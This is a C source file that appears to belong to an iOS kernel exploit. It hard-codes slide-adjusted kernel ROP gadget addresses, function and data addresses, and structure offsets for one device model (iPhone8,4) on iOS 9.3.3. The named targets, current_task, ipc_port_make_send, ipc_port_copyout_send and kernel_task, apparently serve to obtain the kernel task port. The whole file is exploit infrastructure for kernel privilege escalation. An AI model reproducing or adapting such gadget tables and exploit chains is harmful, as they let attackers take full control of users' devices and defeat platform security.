#include "common.h"             // DEBUG, addr_t
#include "slide.h"              // get_kernel_slide

#include "find.h"

void find_all_offsets(file_t *kernel, offsets_t *off)
{
    DEBUG("Looking for offsets in kernel...");

    size_t slide = get_kernel_slide();

    // TODO: Offset finding is entirely unimplemented.
    //       All values below are supposed to be determined by analysing the kernel at runtime.
    //       (These are the offsets for iPhone8,4/N69AP and iOS 9.3.3.)

    off->slid.gadget_load_x20_x19                   = 0xffffff800402b69c + slide;
    off->slid.gadget_ldp_x9_add_sp_sp_0x10          = 0xffffff8005aea01c + slide;
    off->slid.gadget_ldr_x0_sp_0x20_load_x22_x19    = 0xffffff80040e3d1c + slide;
    off->slid.gadget_add_x0_x0_x19_load_x20_x19     = 0xffffff80040ddbcc + slide;
    off->slid.gadget_blr_x20_load_x22_x19           = 0xffffff8004e5eb60 + slide;
    off->slid.gadget_str_x0_x19_load_x20_x19        = 0xffffff800402b698 + slide;
    off->slid.gadget_ldr_x0_x21_load_x24_19         = 0xffffff80042fbfbc + slide;
    off->slid.gadget_OSUnserializeXML_return        = 0xffffff80043f08c4 + slide;
    off->slid.frag_mov_x1_x20_blr_x19               = 0xffffff800402d978 + slide;
    off->slid.func_ldr_x0_x0                        = 0xffffff8004119534 + slide;
    off->slid.func_current_task                     = 0xffffff8004052e0c + slide;
    off->slid.func_ipc_port_copyout_send            = 0xffffff800401fc48 + slide;
    off->slid.func_ipc_port_make_send               = 0xffffff800401fb9c + slide;
    off->slid.data_kernel_task                      = 0xffffff8004536010 + slide;
    off->slid.data_realhost_special                 = 0xffffff80045946c0 + slide;
    off->unslid.off_task_itk_self                   = 0xe8;
    off->unslid.off_task_itk_space                  = 0x2a0;
    off->unslid.OSUnserializeXML_stack              = 0x100;
    off->unslid.is_io_service_open_extended_stack   = 0x120;

    DEBUG("Got all offsets");
}
